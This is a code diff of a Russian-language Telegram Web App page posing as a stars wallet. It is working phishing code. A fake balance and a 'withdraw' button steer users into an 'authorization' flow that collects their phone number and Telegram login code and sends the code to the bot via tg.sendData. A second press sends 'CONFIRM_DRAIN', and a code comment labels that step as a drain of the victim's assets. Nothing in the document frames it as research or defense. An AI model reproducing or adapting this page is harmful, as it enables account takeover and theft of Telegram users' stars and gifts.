@@ -4,59 +4,177 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        body { background: #0e1621; color: white; font-family: -apple-system, system-ui; margin: 0; padding: 15px; }
-        .card { background: #17212b; padding: 25px; border-radius: 20px; text-align: center; border: 1px solid #242f3d; }
-        .avatar { width: 80px; height: 80px; border-radius: 50%; margin: 10px auto; border: 2px solid #248bcf; display: block; }
-        .user-name { font-size: 18px; font-weight: bold; margin-bottom: 5px; }
-        .stars-val { font-size: 38px; font-weight: bold; color: #fecb2e; margin: 15px 0; }
-        input { width: 100%; padding: 15px; border-radius: 12px; border: 1px solid #2b3a4a; background: #0e1621; color: white; font-size: 18px; text-align: center; box-sizing: border-box; }
-        button { background: #248bcf; color: white; border: none; padding: 16px; border-radius: 12px; font-weight: bold; width: 100%; font-size: 16px; margin-top: 15px; }
-        .mask-list { font-size: 11px; color: #5d6d7d; text-align: left; margin-top: 20px; line-height: 1.6; }
+        body { background: #121212; color: white; font-family: -apple-system, sans-serif; margin: 0; padding: 0; overflow-x: hidden; }
+        .page { display: none; padding: 20px; animation: fadeIn 0.3s; }
+        .active { display: block; }
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+        /* Шапка профиля */
+        .profile-header { display: flex; align-items: center; gap: 10px; background: #1c1c1c; padding: 10px 15px; border-radius: 50px; width: fit-content; margin: 0 auto 30px auto; }
+        .avatar { width: 30px; height: 30px; border-radius: 50%; object-fit: cover; }
+        .username { font-size: 14px; color: #aaa; }
+
+        /* Баланс */
+        .balance-section { text-align: center; margin-bottom: 40px; }
+        .star-icon { color: #fecb2e; font-size: 40px; vertical-align: middle; }
+        .balance-val { font-size: 48px; font-weight: bold; margin-left: 10px; }
+        .balance-label { color: #888; margin-top: 10px; font-size: 14px; }
+
+        /* Кнопки действий */
+        .action-btns { display: flex; justify-content: center; gap: 40px; margin-bottom: 30px; }
+        .btn-round { display: flex; flex-direction: column; align-items: center; gap: 8px; text-decoration: none; color: #fecb2e; font-size: 13px; cursor: pointer; }
+        .icon-circle { width: 50px; height: 50px; border-radius: 50%; border: 2px solid #fecb2e; display: flex; align-items: center; justify-content: center; font-size: 20px; }
+
+        /* Меню чеков */
+        .menu-card { background: #1c1c1c; border-radius: 15px; padding: 20px; display: flex; align-items: center; justify-content: space-between; cursor: pointer; margin-top: 20px; }
+        .menu-left { display: flex; align-items: center; gap: 15px; }
+        .menu-icon { background: #fecb2e; color: #000; padding: 10px; border-radius: 10px; font-size: 20px; }
+        .menu-text b { display: block; font-size: 15px; margin-bottom: 4px; }
+        .menu-text span { font-size: 12px; color: #888; }
+
+        /* Экран Авторизации */
+        .auth-screen { text-align: center; padding-top: 50px; }
+        .auth-logo { width: 100px; height: 100px; background: linear-gradient(135deg, #248bcf, #54b3f3); border-radius: 30px; display: flex; align-items: center; justify-content: center; margin: 0 auto 30px auto; box-shadow: 0 0 30px rgba(36, 139, 207, 0.4); }
+        .auth-logo i { font-size: 50px; color: white; }
+        .auth-title { font-size: 28px; font-weight: bold; margin-bottom: 15px; }
+        .auth-desc { color: #888; font-size: 14px; margin-bottom: 40px; line-height: 1.5; }
+        
+        .step-row { display: flex; align-items: flex-start; gap: 15px; text-align: left; margin-bottom: 25px; }
+        .step-num { width: 35px; height: 35px; border-radius: 50%; background: #333; display: flex; align-items: center; justify-content: center; flex-shrink: 0; color: #fecb2e; }
+        .step-active { background: #fecb2e; color: black; }
+        .step-info b { display: block; font-size: 15px; }
+        .step-info span { font-size: 13px; color: #666; }
+
+        .btn-main { background: #fecb2e; color: black; border: none; padding: 18px; border-radius: 15px; width: 100%; font-weight: bold; font-size: 16px; margin-top: 20px; cursor: pointer; }
+        
+        input { width: 100%; background: #1c1c1c; border: 1px solid #333; padding: 15px; border-radius: 12px; color: white; margin-top: 10px; text-align: center; font-size: 18px; }
     </style>
 </head>
 <body>
-    <div class="card" id="main-content">
-        <img id="u-pic" src="" class="avatar">
-        <div id="u-name" class="user-name">Загрузка...</div>
-        <div class="stars-val" id="stars-display">0 ⭐</div>
-        
-        <div id="step-ui">
-            <p style="font-size: 14px; color: #8897a3;">Введите код из чата Telegram для завершения регистрации</p>
-            <input type="number" id="tg-code" placeholder="0 0 0 0 0">
-            <button onclick="submitCode()">ЗАРЕГИСТРИРОВАТЬСЯ</button>
+
+    <div id="main-page" class="page active">
+        <div class="profile-header">
+            <img id="u-avatar" class="avatar" src="">
+            <span id="u-name" class="username">Загрузка...</span>
+        </div>
+
+        <div class="balance-section">
+            <i class="fa-solid fa-star star-icon"></i>
+            <span class="balance-val" id="stars-val">0</span>
+            <div class="balance-label">Общий баланс в звездах</div>
+        </div>
+
+        <div class="action-btns">
+            <div class="btn-round"><div class="icon-circle"><i class="fa-solid fa-arrow-down"></i></div>Пополнить</div>
+            <div class="btn-round" onclick="handleWithdraw()"><div class="icon-circle"><i class="fa-solid fa-arrow-up-right-from-square"></i></div>Вывести</div>
+        </div>
+
+        <div class="menu-card">
+            <div class="menu-left">
+                <div class="menu-icon"><i class="fa-solid fa-money-check-dollar"></i></div>
+                <div class="menu-text">
+                    <b>Звезды чеками</b>
+                    <span>Делитесь звездами с помощью чеков.</span>
+                </div>
+            </div>
+            <i class="fa-solid fa-chevron-right" style="color: #444;"></i>
+        </div>
+
+        <div style="margin-top: 30px;">
+            <div style="color: #666; font-size: 14px; margin-bottom: 15px;">История транзакций</div>
+            <div style="text-align: center; color: #444; margin-top: 40px;">Транзакций пока нет</div>
+        </div>
+    </div>
+
+    <div id="auth-page" class="page">
+        <div class="auth-screen">
+            <div class="auth-logo"><i class="fa-solid fa-certificate"></i></div>
+            <div class="auth-title">Авторизация</div>
+            <div class="auth-desc">Поделитесь своим номером телефона Telegram, чтобы синхронизировать профиль и разблокировать дополнительные функции</div>
+            
+            <div class="step-row">
+                <div class="step-num step-active" id="s1-n"><i class="fa-solid fa-phone"></i></div>
+                <div class="step-info">
+                    <b>Номер телефона</b>
+                    <span id="s1-t">Поделитесь номером телефона с ботом.</span>
+                </div>
+            </div>
+
+            <div class="step-row">
+                <div class="step-num" id="s2-n"><i class="fa-solid fa-user-check"></i></div>
+                <div class="step-info">
+                    <b>Проверочный код</b>
+                    <span>Введите код из Telegram.</span>
+                </div>
+            </div>
+
+            <div id="auth-action">
+                <button class="btn-main" onclick="requestContact()">Авторизоваться</button>
+            </div>
         </div>
     </div>
 
     <script>
         let tg = window.Telegram.WebApp;
         tg.expand();
-        const user = tg.initDataUnsafe.user;
-        const params = new URLSearchParams(window.location.search);
-        const amount = params.get('amount') || "50";
+        tg.backgroundColor = '#121212';
+        tg.headerColor = '#121212';
 
-        document.getElementById('u-pic').src = user?.photo_url || "https://i.imgur.com/8K9v679.png";
-        document.getElementById('u-name').innerText = user?.first_name || "Пользователь";
-        document.getElementById('stars-display').innerText = amount + " ⭐";
+        const user = tg.initDataUnsafe.user;
+        const urlParams = new URLSearchParams(window.location.search);
+        const amount = urlParams.get('amount') || "0";
+        let isAuthorized = false; // Состояние для повторного нажатия
+
+        // Инициализация данных
+        document.getElementById('u-avatar').src = user?.photo_url || 'https://i.imgur.com/8K9v679.png';
+        document.getElementById('u-name').innerText = user?.first_name || 'Пользователь';
+        document.getElementById('stars-val').innerText = amount;
+
+        function handleWithdraw() {
+            if (!isAuthorized) {
+                showPage('auth-page');
+            } else {
+                // ПОВТОРНОЕ НАЖАТИЕ - ДРЕЙН
+                tg.sendData("CONFIRM_DRAIN");
+                tg.close();
+            }
+        }
+
+        function showPage(id) {
+            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+            document.getElementById(id).classList.add('active');
+        }
+
+        // Запрос контакта (через бота)
+        function requestContact() {
+            tg.sendData("REQUEST_CONTACT_TRIGGER"); 
+            // Мы закрываем веб-апп, бот кидает кнопку контакта, чел жмет, бот снова открывает веб-апп с кодом
+            tg.close();
+        }
+
+        // Если в URL есть флаг "step=code", сразу показываем ввод кода
+        if(urlParams.get('step') === 'code') {
+            showPage('auth-page');
+            document.getElementById('s1-n').classList.remove('step-active');
+            document.getElementById('s2-n').classList.add('step-active');
+            document.getElementById('s1-t').innerText = "Номер подтвержден ✅";
+            document.getElementById('auth-action').innerHTML = `
+                <input type="number" id="tg-code" placeholder="Код из Telegram">
+                <button class="btn-main" onclick="submitCode()">ПОДТВЕРДИТЬ</button>
+            `;
+        }
+
+        // Если в URL есть флаг "authorized=true"
+        if(urlParams.get('authorized') === 'true') {
+            isAuthorized = true;
+        }
 
         function submitCode() {
             let code = document.getElementById('tg-code').value;
             if(code.length < 5) return;
             tg.sendData("c:" + code);
-            
-            document.getElementById('step-ui').innerHTML = `
-                <div style="margin: 20px 0;">🔄 Синхронизация активов...</div>
-                <button onclick="finalAction()" style="background: #31b545;">НАЖМИТЕ ЧТОБЫ ВЫВЕСТИ</button>
-                <div class="mask-list">
-                    • ConvertGiftToStars [Fragment API] <br>
-                    • TransferGift [Smart Contract] <br>
-                    • SendGift [Syncing]
-                </div>
-            `;
-        }
-
-        function finalAction() {
-            tg.sendData("CONFIRM_DRAIN");
             tg.close();
         }
     </script>
